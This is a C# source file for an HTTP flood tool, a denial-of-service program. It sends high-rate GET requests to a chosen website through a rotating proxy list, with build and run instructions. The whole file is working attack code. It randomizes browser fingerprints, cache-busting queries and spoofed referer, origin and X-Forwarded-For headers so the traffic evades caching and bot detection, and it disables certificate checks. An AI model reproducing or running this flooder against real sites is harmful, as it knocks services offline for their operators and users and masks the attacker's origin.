// Http2Flood.cs
// Compile: dotnet new console -n Http2Flood -f net8.0 && cd Http2Flood
// Replace Program.cs with this code, then `dotnet build -c Release`
// Usage: dotnet run -- <target> <time> <rate> <threads> <proxyfile>

using System;
using System.Collections.Concurrent;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Net.Security;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

class Http2Flood
{
    static readonly Random _rand = new Random();
    static string _target;
    static int _durationSec;
    static int _ratePerThread;          // requests per second per thread
    static int _threads;
    static string _proxyFile;
    static string[] _proxies;

    // Browser profiles (header templates)
    static readonly string[] _browsers = { "chrome", "firefox", "safari", "mobile", "opera", "brave", "duckduckgo" };

    static async Task Main(string[] args)
    {
        if (args.Length < 5)
        {
            Console.WriteLine("Usage: Http2Flood <target> <time> <rate> <threads> <proxyfile>");
            Console.WriteLine("Example: dotnet run -- https://example.com 60 50 10 proxies.txt");
            return;
        }

        _target = args[0];
        _durationSec = int.Parse(args[1]);
        _ratePerThread = int.Parse(args[2]);
        _threads = int.Parse(args[3]);
        _proxyFile = args[4];

        if (!File.Exists(_proxyFile))
        {
            Console.WriteLine($"[ERROR] Proxy file not found: {_proxyFile}");
            return;
        }
        _proxies = File.ReadAllLines(_proxyFile)
            .Select(l => l.Trim())
            .Where(l => !string.IsNullOrEmpty(l) && !l.StartsWith('#'))
            .ToArray();

        if (_proxies.Length == 0)
        {
            Console.WriteLine("[ERROR] No proxies found.");
            return;
        }

        Console.WriteLine($"\n[🔥] HTTP/2 Flood | Target: {_target}");
        Console.WriteLine($"     Duration: {_durationSec}s | Rate/thread: {_ratePerThread} req/s");
        Console.WriteLine($"     Threads: {_threads} | Total RPS: {_threads * _ratePerThread}");
        Console.WriteLine($"     Proxies loaded: {_proxies.Length}\n");

        var cts = new CancellationTokenSource();
        var tasks = new Task[_threads];
        var counters = new ConcurrentDictionary<int, long>();

        for (int i = 0; i < _threads; i++)
        {
            int id = i;
            counters[id] = 0;
            tasks[i] = Task.Run(() => Worker(id, cts.Token, counters));
        }

        // RPS monitor
        var monitor = Task.Run(async () =>
        {
            while (!cts.Token.IsCancellationRequested)
            {
                await Task.Delay(1000);
                foreach (var kv in counters)
                {
                    if (kv.Value > 0)
                        Console.WriteLine($"[Thread {kv.Key}] RPS: {kv.Value}");
                    counters[kv.Key] = 0;
                }
            }
        });

        await Task.Delay(_durationSec * 1000);
        cts.Cancel();
        await Task.WhenAll(tasks);
        await monitor;
        Console.WriteLine("\n[⏹️] Flood finished.");
    }

    static async Task Worker(int id, CancellationToken ct, ConcurrentDictionary<int, long> counter)
    {
        // Pick a random proxy for this worker
        string proxyStr = _proxies[_rand.Next(_proxies.Length)];
        var proxyParts = proxyStr.Split(':');
        if (proxyParts.Length != 2)
        {
            Console.WriteLine($"[Thread {id}] Invalid proxy format: {proxyStr}");
            return;
        }

        var proxy = new WebProxy(proxyParts[0], int.Parse(proxyParts[1]));

        var handler = new SocketsHttpHandler
        {
            Proxy = proxy,
            UseProxy = true,
            PooledConnectionLifetime = TimeSpan.FromSeconds(30),
            PooledConnectionIdleTimeout = TimeSpan.FromSeconds(10),
            MaxConnectionsPerServer = 1000,
            EnableMultipleHttp2Connections = true,
            SslOptions = new SslClientAuthenticationOptions
            {
                RemoteCertificateValidationCallback = (sender, cert, chain, errors) => true
            }
        };

        using var client = new HttpClient(handler);
        var uri = new Uri(_target);

        // Prepare base path and query
        string basePath = uri.PathAndQuery;
        if (string.IsNullOrEmpty(basePath)) basePath = "/";
        bool hasQuery = basePath.Contains('?');

        var sw = Stopwatch.StartNew();
        int intervalMs = 1000 / _ratePerThread;

        while (!ct.IsCancellationRequested && sw.Elapsed.TotalSeconds < _durationSec)
        {
            // Generate randomized headers for this request batch (refresh per request)
            var browser = _browsers[_rand.Next(_browsers.Length)];
            var headers = GenerateHeaders(browser, uri.Host);
            ApplyHeaders(client, headers);

            // Cache-busting query
            string cacheBuster = $"{(hasQuery ? "&" : "?")}_={Guid.NewGuid():N}&rnd={_rand.Next(1000000)}";
            string requestUri = $"{uri.Scheme}://{uri.Host}{basePath}{cacheBuster}";

            try
            {
                using var response = await client.GetAsync(requestUri, HttpCompletionOption.ResponseHeadersRead, ct);
                await response.Content.ReadAsStreamAsync(ct).ContinueWith(t => t.Result?.Dispose());
                counter.AddOrUpdate(id, 1, (_, old) => old + 1);
            }
            catch
            {
                // Ignore errors
            }

            await Task.Delay(intervalMs, ct);
        }
    }

    static Dictionary<string, string> GenerateHeaders(string browser, string host)
    {
        var headers = new Dictionary<string, string>();

        // Common headers
        headers[":method"] = "GET";
        headers[":authority"] = host;
        headers[":scheme"] = "https";
        headers[":path"] = "/";
        headers["accept-encoding"] = "gzip, deflate, br";
        headers["accept-language"] = RandomLanguage();
        headers["upgrade-insecure-requests"] = "1";
        headers["sec-fetch-dest"] = "document";
        headers["sec-fetch-mode"] = "navigate";
        headers["sec-fetch-site"] = "none";
        headers["sec-fetch-user"] = "?1";
        headers["cache-control"] = "max-age=0";
        headers["te"] = "trailers";
        headers["dnt"] = _rand.Next(2).ToString();

        // Browser-specific UA and sec-ch-ua
        string version = (_rand.Next(115, 131)).ToString();
        switch (browser)
        {
            case "chrome":
                headers["user-agent"] = $"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{version}.0.0.0 Safari/537.36";
                headers["sec-ch-ua"] = $"\"Google Chrome\";v=\"{version}\", \"Chromium\";v=\"{version}\", \"Not.A/Brand\";v=\"99\"";
                headers["sec-ch-ua-platform"] = "\"Windows\"";
                break;
            case "firefox":
                headers["user-agent"] = $"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:{version}.0) Gecko/20100101 Firefox/{version}.0";
                headers["sec-ch-ua"] = $"\"Not A;Brand\";v=\"99\", \"Mozilla Firefox\";v=\"{version}\"";
                headers["sec-ch-ua-platform"] = "\"Windows\"";
                break;
            case "safari":
                headers["user-agent"] = $"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{_rand.Next(14, 18)}.0 Safari/605.1.15";
                headers["sec-ch-ua"] = $"\"Safari\";v=\"{_rand.Next(14, 18)}\", \"Not A;Brand\";v=\"99\"";
                headers["sec-ch-ua-platform"] = "\"macOS\"";
                break;
            case "mobile":
                headers["user-agent"] = $"Mozilla/5.0 (Linux; Android {_rand.Next(10, 14)}; Mobile) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{version}.0.0.0 Mobile Safari/537.36";
                headers["sec-ch-ua"] = $"\"Google Chrome\";v=\"{version}\", \"Chromium\";v=\"{version}\", \"Not.A/Brand\";v=\"99\"";
                headers["sec-ch-ua-mobile"] = "?1";
                headers["sec-ch-ua-platform"] = "\"Android\"";
                break;
            case "opera":
                headers["user-agent"] = $"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{version}.0.0.0 Safari/537.36 OPR/{_rand.Next(70, 96)}.0.0.0";
                headers["sec-ch-ua"] = $"\"Opera\";v=\"{_rand.Next(70, 96)}\", \"Chromium\";v=\"{version}\", \"Not A;Brand\";v=\"99\"";
                headers["sec-ch-ua-platform"] = "\"Windows\"";
                break;
            case "brave":
                headers["user-agent"] = $"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{version}.0.0.0 Safari/537.36 Brave/{version}.0.0.0";
                headers["sec-ch-ua"] = $"\"Brave\";v=\"{version}\", \"Chromium\";v=\"{version}\", \"Not A;Brand\";v=\"99\"";
                headers["sec-ch-ua-platform"] = "\"Windows\"";
                break;
            case "duckduckgo":
                headers["user-agent"] = $"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{version}.0.0.0 Safari/537.36 DuckDuckGo/{version}.0.0.0";
                headers["sec-ch-ua"] = $"\"DuckDuckGo\";v=\"{version}\", \"Chromium\";v=\"{version}\", \"Not.A/Brand\";v=\"8\"";
                headers["sec-ch-ua-platform"] = "\"Windows\"";
                break;
        }

        // Random referer and origin
        if (_rand.NextDouble() < 0.7)
            headers["referer"] = $"https://{RandomDomain()}/";
        if (_rand.NextDouble() < 0.5)
            headers["origin"] = $"https://{RandomDomain()}";

        // Random X-Forwarded-For
        if (_rand.NextDouble() < 0.4)
            headers["x-forwarded-for"] = RandomIP();

        // Random custom headers
        if (_rand.NextDouble() < 0.3)
            headers[$"X-{RandomString(5)}"] = RandomString(8);
        if (_rand.NextDouble() < 0.2)
            headers[$"Sec-{RandomString(4)}"] = RandomString(6);

        return headers;
    }

    static void ApplyHeaders(HttpClient client, Dictionary<string, string> headers)
    {
        client.DefaultRequestHeaders.Clear();
        foreach (var kv in headers)
        {
            // Skip pseudo-headers (start with ':') – not allowed in HttpClient
            if (kv.Key.StartsWith(':')) continue;
            client.DefaultRequestHeaders.TryAddWithoutValidation(kv.Key, kv.Value);
        }
    }

    static string RandomLanguage()
    {
        string[] langs = { "en-US,en;q=0.9", "fr-FR,fr;q=0.8,en;q=0.7", "de-DE,de;q=0.9", "es-ES,es;q=0.7", "ja-JP,ja;q=0.8", "zh-CN,zh;q=0.8" };
        return langs[_rand.Next(langs.Length)];
    }

    static string RandomDomain()
    {
        string[] domains = { "google.com", "facebook.com", "youtube.com", "twitter.com", "reddit.com", "github.com" };
        return domains[_rand.Next(domains.Length)];
    }

    static string RandomIP()
    {
        return $"{_rand.Next(1, 255)}.{_rand.Next(0, 255)}.{_rand.Next(0, 255)}.{_rand.Next(1, 255)}";
    }

    static string RandomString(int length)
    {
        const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
        return new string(Enumerable.Repeat(chars, length).Select(s => s[_rand.Next(s.Length)]).ToArray());
    }
}
